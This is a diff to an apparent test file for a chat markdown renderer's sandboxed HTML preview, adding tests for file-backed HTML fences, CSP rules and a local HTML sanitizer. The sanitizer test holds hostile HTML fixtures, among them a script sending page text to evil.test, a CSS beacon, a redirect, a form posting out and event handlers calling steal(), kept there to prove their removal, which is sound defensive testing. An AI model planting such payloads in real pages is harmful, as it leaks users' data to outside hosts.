@@ -52,7 +52,8 @@ const testWindow = setupDom();
 
 const { RichMarkdown } = await import("./MarkdownBody");
 const { sanitizeStyleValue, containsHtmlMarkup, normalizeMultilineHtmlBlocks } = await import("./htmlSanitize");
-const { buildHtmlPreviewDocument } = await import("./HtmlPreviewBlock");
+const { buildHtmlPreviewDocument, parseHtmlFileDirective, sanitizeLocalHtml } = await import("./HtmlPreviewBlock");
+const { configureHtmlFileLoader } = await import("./htmlFileLoader");
 
 test("containsHtmlMarkup gates on real tags, not comparisons", () => {
   assert(containsHtmlMarkup("press <kbd>Ctrl</kbd>"), "opening tag detected");
@@ -156,6 +157,29 @@ test("html code fence renders a locked-down sandboxed frame", async () => {
   assert(srcdoc.includes("Content-Security-Policy"), "CSP meta is embedded");
 });
 
+test("file-backed HTML fence loads and sanitizes its single source", async () => {
+  const path = "C:\\Users\\dev\\Desktop\\design-system.html";
+  let reads = 0;
+  configureHtmlFileLoader(async (requested) => {
+    reads += 1;
+    assert(requested === path, "loader receives the exact absolute path");
+    return "<main class='p-4'>From file</main><script>steal()</script>";
+  });
+  assert(parseHtmlFileDirective(`@file "${path}"`) === path, "quoted file directive parses");
+  const { host } = await render(<RichMarkdown text={`\`\`\`html\n@file ${path}\n\`\`\``} />);
+  await act(async () => {
+    await Promise.resolve();
+  });
+  const frame = host.querySelector("iframe[data-testid='chat-html-preview-frame']");
+  assert(frame, "file-backed preview iframe rendered");
+  const srcdoc = frame.getAttribute("srcdoc") ?? "";
+  assert(srcdoc.includes("From file"), "loaded file is the rendered source");
+  assert(!srcdoc.includes("steal()"), "file scripts are removed before rendering");
+  assert(host.textContent?.includes("Local file"), "file provenance is visible");
+  assert(reads === 1, "file is loaded once on mount");
+  configureHtmlFileLoader(null);
+});
+
 test("html fullscreen survives a markdown parent rerender", async () => {
   const text = "```html\n<b>stable fullscreen</b>\n```";
   const { host, root } = await render(<RichMarkdown text={text} fontScale={1} />);
@@ -207,17 +231,41 @@ test("html fullscreen follows its scroll host bounds after resize", async () => 
 });
 
 test("preview document CSP blocks network egress", () => {
-  const doc = buildHtmlPreviewDocument("<b>x</b>", {
+  const doc = buildHtmlPreviewDocument("<b class=\"animate-pulse\">x</b>", {
     bg: "#000",
     fg: "#fff",
     accent: "#08f",
     muted: "#888",
     border: "#333",
-  });
+  }, "window.__tailwindRuntimeLoaded = true;");
   assert(doc.includes("connect-src 'none'"), "connect-src is none");
   assert(doc.includes("default-src 'none'"), "default-src is none");
   assert(doc.includes("form-action 'none'"), "form-action is none");
   assert(!doc.includes("allow-same-origin"), "document never opts into same-origin");
+  assert(doc.includes("window.__tailwindRuntimeLoaded = true"), "bundled Tailwind runtime is inline");
+  assert(doc.includes("window.ct=Object.freeze"), "self-describing ct runtime is inline");
+  assert(doc.includes("ct.file.pick(options)"), "user-picked file capability is documented");
+  assert(doc.includes("ct.file.renderHtml(options)"), "sanitized local HTML capability is documented");
+  assert(!doc.includes("<script src="), "preview loads no network scripts");
+});
+
+test("local HTML sanitization removes active and external content", () => {
+  const result = sanitizeLocalHtml(`<!doctype html><html><head>
+    <meta http-equiv="refresh" content="0;url=https://evil.test">
+    <style>.safe{color:red}</style><style>.leak{background:url(https://evil.test/x)}</style>
+    <script>location='https://evil.test/'+document.body.innerText</script>
+  </head><body onload="steal()"><form action="https://evil.test"><button>Keep label</button></form>
+    <a href="https://evil.test" onclick="steal()">Safe text</a>
+    <img src="https://evil.test/pixel"><img src="data:image/png;base64,AA==">
+    <iframe src="https://evil.test"></iframe>
+  </body></html>`);
+  assert(!result.html.includes("evil.test"), "external destinations are removed");
+  assert(!result.html.includes("<script"), "scripts are removed");
+  assert(!result.html.includes("<form"), "forms are unwrapped");
+  assert(!result.html.includes("onload") && !result.html.includes("onclick"), "event handlers are removed");
+  assert(result.html.includes("Keep label") && result.html.includes("Safe text"), "safe content remains");
+  assert(result.html.includes("data:image/png;base64,AA=="), "embedded raster image remains");
+  assert(result.removed >= 8, "sanitizer reports removed active content");
 });
 
 test("non-html fences still render as code, not previews", async () => {
